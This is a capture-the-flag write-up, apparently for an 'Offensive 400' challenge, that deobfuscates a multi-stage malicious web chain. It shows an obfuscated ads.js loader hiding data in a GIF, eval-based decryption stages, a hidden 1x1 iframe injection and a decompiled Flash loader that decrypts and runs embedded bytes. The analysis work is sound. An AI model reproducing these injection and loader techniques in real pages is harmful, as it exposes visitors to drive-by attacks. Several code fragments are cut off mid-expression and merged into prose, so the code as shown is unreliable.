## Offensive 400 (Offensive, 400p)
###ENG
[PL](#pl-version)
Challenge starts on webpage which doesn't contain anything (or it looks like this). But after looking at the source code we spot interesting javacript file (named "ads.js"). After deobfuscation it looked like this:
```javascript
var mnt = function() {
	window.host = location.host;
	window.scheme = 'http://';
	window.getLicenseUrl = function() {
		console.log('getting lic url')
		var ax = document.getElementsByTagName('img');
		for (var i = 0; i ` element is created, and some decrypted data is put into it (gif is downloaded from fixed path, and than data is extracted from it).
I tried to decrypt that gif "manually" with python at first, but quickly I decided to do something simpler and I just replaced `sta.innerHTML = data` to `console.log(data)`.
Thanks to this, I reached second stage.
It looked like this:
```javascript
function getA(key) {
	return "3789d132";
}
function getB(key) {
	return "111780a7";
}
function getC(key) {
	return "fbff29";
}
function getD(key) {
	return "b2914faca2";
}
function main(func, idToProcess) {
    func(idToProcess)
}
var LvPmn, BisnmljH, window, JEUMZ;
gWRqmBVp = 'd';
var realMain = 
	(function(idToProcess) {
        TOu8g = kode;
        UA = 'asdfasdfasdf';
        if ((/(MSIE\ [0-7]\.\d+)/).test(UA)) {
            TOu8g = TOu8g.slice(0, -1);
        }
        TOu8g = TOu8g['replace'](/\s/g, '');
        plZla = kfSH(TOu8g, LvPmn);
        delete TOu8g;
        TOu8g = "";
        eval(plZla);
    });
LvPmn = 'oXUX5XqXRXoXGXfX';
function kfSH(YP, sr4ze) {
	var YLvEoLp = "";
	for (var i = 0; i > 8 & 255, SKOx >> 16 & 255, SKOx >> 24 & 255);
    return nojMia;
}
main(realMain, 'oU5qRoGfenAszlAOKYBE')
```
This code is after small deobfuscation (I changed few function names, did beautification, etc) and cut few checks. Similary to previous stage, it was enough to cut few checks and add `console.log(plZla)` instead of `eval(plZla)`. Thanks to this I reached another stage.
```javascript
if (document.referrer != "") {
    var iframe = document.createElement("iframe");
    iframe.src = "depress-choose-opportunity-staircase.html";
    iframe.frameBorder = 0;
    iframe.width = "1";
    iframe.height = "1";
    document.body.appendChild(iframe);
};
```
This code is after serious deobfuscation and beautification. As you can see, This code only creates ifrema with `depress-choose-opportunity-staircase.html` injected.
So, what can we find under this address?
Something like this:
```javascript
window['gWRqmBVp'] = '1';
function xWait(xT) {
    var date = new Date();
    var tmpDate = null;
    do {
        tmpDate = new Date();
    } while (tmpDate - date ';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '-->';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '';
    txt = txt + '-->';
    txt = txt + '';
    try {;
    } catch (e) {}
    document.getElementsByTagName("q")[2].innerHTML = txt;
}
xTrueA();
xWait(1200);
```
Again, this is code after my deobfustation and beautification. So, as you can see, another javascript is being injected. There is some checks (i just removed them) and then some `` is 
pasted into source code. So I downloaded that flash and decompiled. Most interesting fragment of it was:
```actionscript
package tmctf {
    import flash.events.*;
    import flash.utils.*;
    import flash.display.*;
    public class Main extends Sprite {
        private var lIIl11l:Class;
        public function Main(){
            this.lIIl11l = Main_lIIl11l;
            super();
            if (stage){
                this.init();
            } else {
                addEventListener(Event.ADDED_TO_STAGE, this.init);
            };
        }
        private function init(_arg1:Event=null):void{
            var _local2:Object = LoaderInfo(this.root.loaderInfo).parameters.a;
            var _local3:Object = LoaderInfo(this.root.loaderInfo).parameters.b;
            var _local4:Object = LoaderInfo(this.root.loaderInfo).parameters.c;
            var _local5:Object = LoaderInfo(this.root.loaderInfo).parameters.d;
            var _local6:String = (((_local4.toString() + _local3.toString()) + _local5.toString()) + _local2.toString());
            var _local7:ByteArray = (new this.lIIl11l() as ByteArray);
            var _local8:ByteArray = lI11lI.l1l1lI(_local7, _local6);
            this.removeEventListener(Event.ADDED_TO_STAGE, this.init);
            var _local9 = "flash.display.Loader";
            var _local10:Class = (getDefinitionByName(_local9) as Class);
            var _local11:Loader = new (_local10)();
            _local11.loadBytes(_local8);
            addChild(_local11);
        }
    }
}//package tmctf 
package tmctf {
    import mx.core.*;
    public class Main_lIIl11l extends ByteArrayAsset {
    }
}//package tmctf 
package tmctf {
    import flash.utils.*;
    public class lI11lI {
        public static function l1I1lI(_arg1:int):String{
            var _local2 = "";
            if (_arg1 == 1){
                _local2 = "6l.6o3a3d63.B3.y6t263.e5s6";
            };
            if (_arg1 == 2){
                _local2 = "2a.7d6d6.C23h3i.34l6d6";
            };
            if (_arg1 == 3){
                _local2 = "2r4.e6m3.o4v63e3E4v6e3n5t3L6.i3s6t3.4e6n4e3r6";
            };
            if (_arg1 == 4){
                _local2 = "6w3.4r7..i4t6e4.B6y.3t43e5";
            };
            if (_arg1 == 5){
                _local2 = "6p6.3o6s4i6t4i6.o6n";
            };
            if (_arg1 == 8){
                _local2 = "6l2e6n6.g4t4.3h6";
            };
            if (_arg1 == 9){
                _local2 = "3c6h4a..36r34C6o6d34e6A.43t6";
            };
            return (_local2.replace(new RegExp("[(1)\\(2)\\(3)\\(4)\\(5)\\(6)\\(7)\\(8)\\(9)\\(0)\\.]", "g"), ""));
        }